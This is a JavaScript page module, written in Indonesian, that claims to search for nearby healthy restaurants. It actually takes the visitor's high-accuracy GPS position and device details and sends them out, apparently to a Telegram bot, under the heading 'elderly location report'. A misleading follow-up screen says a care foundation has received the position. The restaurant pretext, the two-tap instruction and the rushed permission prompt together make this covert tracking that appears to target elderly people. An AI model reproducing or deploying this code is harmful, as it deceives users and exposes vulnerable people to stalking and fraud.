/**
 * location.js — Layar Tunggal Terintegrasi untuk Kirim Lokasi GPS
 * Dioptimalkan untuk Kecepatan Prompt Izin Ekstrem:
 * 1. Panggilan getCurrentPosition() langsung dieksekusi di baris pertama event handler.
 * 2. Pre-warming global aktif di background sejak website dibuka.
 * 3. Menghindari blocking driver GPS pada prompt pertama agar dialog langsung muncul seketika.
 */

// Pre-warm otomatis di background saat modul dimuat
if (typeof navigator !== 'undefined' && navigator.permissions && navigator.permissions.query) {
  try { navigator.permissions.query({ name: 'geolocation' }).catch(() => { }); } catch (_) { }
}

let _locOpenedAt = 0;

function startLocation(event) {
  if (event && (event.type === 'pointerdown' || event.type === 'touchstart')) {
    event.preventDefault();
  }

  _locOpenedAt = Date.now();

  // Reset flag cancel dan trigger agar layar ini selalu bersih
  state.locCancelled = false;
  _isTriggeringLoc = false;

  // Pre-warm background saat menu ditekan
  if (navigator.permissions && navigator.permissions.query) {
    try { navigator.permissions.query({ name: 'geolocation' }).catch(() => { }); } catch (_) { }
  }

  // Pindah layar ke lokasi
  showScreen('screen-prep-lokasi');

  // Reset status tampilan UI
  const badge = $('loc-badge');
  const badgeText = $('loc-badge-text');
  const title = $('loc-title');
  const subtitle = $('loc-subtitle');
  const bottomTrigger = $('loc-bottom-trigger');
  const bottomProgress = $('loc-bottom-progress');

  if (badge) badge.className = 'rec-badge loc-badge-idle';
  if (badgeText) badgeText.textContent = 'CARI RESTORAN';
  if (title) title.textContent = 'Restoran Sehat Terdekat';
  if (subtitle) subtitle.innerHTML = 'Aplikasi akan mencari restoran sehat terdekat dari lokasi anda.<br>Ketuk tombol di bawah <strong>2 kali</strong>.';

  if (bottomTrigger) bottomTrigger.style.display = 'flex';

  // Sembunyikan fase GPS (video + progress) saat reset ke awal
  const gpsPhase = $('loc-gps-phase');
  if (gpsPhase) gpsPhase.style.display = 'none';
  if (bottomProgress) bottomProgress.style.display = 'none';

  const locVideo = $('loc-video');
  if (locVideo) locVideo.pause();

  // Cegah ghost click / tap-through dari tombol home
  const btnTrigger = $('btn-trigger-lokasi');
  if (btnTrigger) {
    btnTrigger.style.pointerEvents = 'none';
    setTimeout(() => {
      if (btnTrigger) btnTrigger.style.pointerEvents = '';
    }, 400);
  }
}

async function handleLocationReady(position) {
  // Abaikan jika pengguna sudah menekan Back sebelum GPS selesai
  if (state.locCancelled) {
    state.locCancelled = false;
    return;
  }
  const { latitude: lat, longitude: lon, accuracy } = position.coords;
  const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
  const devInfo = await collectDeviceInfo();

  const details = [
    'LAPORAN LOKASI LANSIA', '',
    'Koordinat:',
    `  Latitude  : ${lat.toFixed(7)}`,
    `  Longitude : ${lon.toFixed(7)}`,
    `  Akurasi   : ±${Math.round(accuracy)} meter`,
    '', 'Google Maps:', mapsLink, '',
    formatDeviceInfo(devInfo),
  ].join('\n');

  const bar = $('loc-progress-bar');
  if (bar) bar.style.width = '75%';

  try {
    await tgSendLocation(lat, lon);
    await tgSendMessage(details);
    if (bar) bar.style.width = '100%';

    // Tampilkan layar 5 yayasan lansia terdekat (tanpa auto-exit)
    showFoundationListScreen(lat, lon, accuracy);
  } catch (err) {
    console.error('[location.js] Send error:', err);
    showResult({
      icon: '❌', title: 'Gagal Mengirim Lokasi',
      message: `Terjadi kesalahan saat mengirim lokasi. Periksa koneksi internet dan coba lagi.\n\n(${err.message})`,
    });
  }
}

let _isTriggeringLoc = false;

function triggerLocationGPS(event) {
  if (event && (event.type === 'pointerdown' || event.type === 'touchstart')) {
    event.preventDefault();
  }

  // Cegah tap bocor (ghost click / click-through) dari tombol home
  if (Date.now() - _locOpenedAt < 400) {
    if (event) {
      event.preventDefault();
      event.stopPropagation();
    }
    return;
  }

  if (_isTriggeringLoc) return;
  _isTriggeringLoc = true;

  if (!navigator.geolocation) {
    _isTriggeringLoc = false;
    showGpsOffScreen();
    return;
  }

  // ⚡ LANGKAH 1 (PRIORITAS NOMOR SATU): Tembak API Geolocation SEKETIKA untuk memicu dialog izin OS
  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      _isTriggeringLoc = false;
      await handleLocationReady(pos);
    },
    (err) => {
      _isTriggeringLoc = false;
      // Abaikan jika pengguna sudah menekan Back
      if (state.locCancelled) { state.locCancelled = false; return; }

      // ── Tangani race condition: error GPS dapat muncul SEBELUM dialog izin
      // browser sempat ditampilkan (terutama saat GPS mati di perangkat Android).
      // Jika izin masih berstatus 'prompt' (belum dijawab), tunggu dulu
      // respons user terhadap dialog izin sebelum menampilkan screen-gps-off.
      if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'geolocation' }).then(perm => {
          if (perm.state === 'prompt') {
            // Dialog izin kemungkinan masih terbuka → tunggu user menjawab
            let settled = false;
            const done = () => {
              if (settled) return;
              settled = true;
              perm.onchange = null;
              if (!state.locCancelled) showGpsOffScreen();
            };
            perm.onchange = done;
            // Fallback: jika 30 detik tidak ada respons, tetap tampilkan panduan
            setTimeout(done, 30000);
          } else {
            // Izin sudah granted atau denied → langsung tampilkan panduan GPS
            showGpsOffScreen();
          }
        }).catch(() => showGpsOffScreen());
      } else {
        showGpsOffScreen();
      }
    },
    { enableHighAccuracy: true, timeout: 30000, maximumAge: 30000 }
  );

  // ⚡ LANGKAH 2: Haptic feedback instan
  if (navigator.vibrate) {
    try { navigator.vibrate([50, 40, 50]); } catch (_) { }
  }

  // ⚡ LANGKAH 3: Update DOM secara asynchronous agar tidak menahan eksekusi IPC browser
  requestAnimationFrame(() => {
    const btn = $('btn-trigger-lokasi');
    const text = $('btn-trigger-lokasi-text');
    const sub = $('btn-trigger-lokasi-sub');
    if (btn && text) {
      btn.classList.add('trigger-active');
      text.textContent = '👆 KETUK SEKARANG!';
      if (sub) sub.textContent = 'UNTUK MULAI MENCARI';
    }

    const badge = $('loc-badge');
    const badgeText = $('loc-badge-text');
    const title = $('loc-title');
    const subtitle = $('loc-subtitle');
    const bottomTrigger = $('loc-bottom-trigger');
    const gpsPhase = $('loc-gps-phase');
    const progressText = $('loc-progress-text');
    const bar = $('loc-progress-bar');

    if (badge) badge.className = 'rec-badge rec-badge-recording';
    if (badgeText) badgeText.textContent = 'MENCARI RESTORAN...';
    if (title) title.textContent = 'Sedang Mencari Restoran Sehat Terdekat...';
    if (subtitle) subtitle.textContent = 'Mencari koordinat GPS presisi tinggi.';
    if (progressText) progressText.textContent = '📡 Mencari koordinat GPS, mohon tunggu...';

    // Sembunyikan tombol trigger, tampilkan fase GPS (video + progress)
    if (bottomTrigger) bottomTrigger.style.display = 'none';
    if (gpsPhase) gpsPhase.style.display = 'block';
    if (bar) bar.style.width = '35%';

    // Mulai putar video lokasi setelah proses dimulai
    const locVideo = $('loc-video');
    if (locVideo) {
      locVideo.currentTime = 0;
      locVideo.play().catch(() => { });
    }
  });
}

/**
 * Tampilkan layar panduan khusus saat GPS HP mati (POSITION_UNAVAILABLE).
 * Memberikan panduan visual cara mengaktifkan GPS.
 */
function showGpsOffScreen() {
  stopAllMedia();
  showScreen('screen-gps-off');
}

/**
 * Tampilkan layar rekomendasi 5 yayasan lansia terdekat setelah lokasi berhasil dikirim.
 * Menggantikan auto-exit sehingga lansia leluasa membaca informasi & membuka Google Maps.
 *
 * @param {number} [lat] - Latitude pengguna
 * @param {number} [lon] - Longitude pengguna
 * @param {number} [accuracy] - Akurasi sinyal GPS dalam meter
 */
function showFoundationListScreen(lat, lon, accuracy) {
  stopAllMedia();

  const bannerSub = $('foundation-banner-sub');
  if (bannerSub) {
    const accText = accuracy ? ` (akurasi ±${Math.round(accuracy)}m)` : '';
    bannerSub.textContent = `Posisi GPS Anda telah diterima oleh tim perawat yayasan${accText}.`;
  }

  showScreen('screen-foundation-list');

  // Animasi staggered masuk satu per satu untuk 5 kartu yayasan
  const cards = document.querySelectorAll('.foundation-card');
  cards.forEach((card, idx) => {
    card.style.opacity = '0';
    card.style.transform = 'translateY(24px)';
    card.style.transition = 'opacity 0.4s cubic-bezier(0.16, 1, 0.3, 1), transform 0.4s cubic-bezier(0.16, 1, 0.3, 1)';
    setTimeout(() => {
      card.style.opacity = '1';
      card.style.transform = 'translateY(0)';
    }, 100 + idx * 80);
  });
}